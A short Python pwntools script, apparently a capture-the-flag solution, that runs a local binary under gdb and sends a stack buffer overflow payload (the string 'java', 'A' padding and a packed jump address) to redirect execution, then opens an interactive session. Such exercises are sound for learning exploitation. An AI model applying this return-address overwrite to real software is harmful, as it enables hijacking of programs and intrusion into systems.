import pwn

p = pwn.process("./java")

pwn.gdb.attach(p, gdbscript="""
  break *0x40088b
  continue
  x/40xb $rax
""")

correct_input = "java"
buff_length = 32
p.sendline(correct_input.encode() + b"A" * (buff_length - len(correct_input)) + pwn.p64(0x4007a2))
p.interactive()